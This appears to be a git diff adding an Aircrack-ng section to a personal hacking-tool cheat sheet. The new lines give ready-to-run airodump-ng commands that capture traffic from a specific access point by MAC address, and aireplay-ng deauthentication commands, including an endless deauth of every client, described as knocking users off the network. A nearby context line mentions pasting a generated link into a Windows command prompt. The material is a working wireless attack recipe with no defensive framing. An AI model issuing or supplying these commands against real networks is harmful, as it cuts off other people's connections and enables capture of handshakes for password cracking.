@@ -789,11 +789,23 @@ Use for find login page or enother info</br>
 `info` info what port and what ip</br>
 `run` run script and copy link to paste in cmd in Windows promt</br>
   
-  
+### Aircrack-ng
+Usuing for scan wifi and overload users from wlan</br>
 
+`airmon-ng check kill` kill not using proccess</br>
 
+`airodump-ng wlan0` monitoring</br>
 
+`airodump-ng --bssid <MAC> --channel <CH> -w <path> <LAN type>` listen certain LAN</br>
+  `airodump-ng --bssid 84:D8:1B:61:C1:2C --channel 11 -w /home/manifast/Desktop/wifi wlan0`</br>
+  `airodump-ng --bssid 84:D8:1B:61:C1:2C --channel 11 wlan0`</br>
 
+`aireplay-ng --deauth <count 0 - all time or 1-100 > -a [rounters's MAC] -c <STATION> <LAN type>` set down</br>
+  `aireplay-ng --deauth 30 -a 84:D8:1B:61:C1:2C -c 70:BB:E9:E2:D3:53 wlan0`</br>
+  `aireplay-ng --deauth 0 -a 84:D8:1B:61:C1:2C wlan0`</br>
+  use --help for more !</br>
+
+![image](https://user-images.githubusercontent.com/62830326/209209858-30573929-c167-446b-a53d-43d4763234af.png)
 
 
 
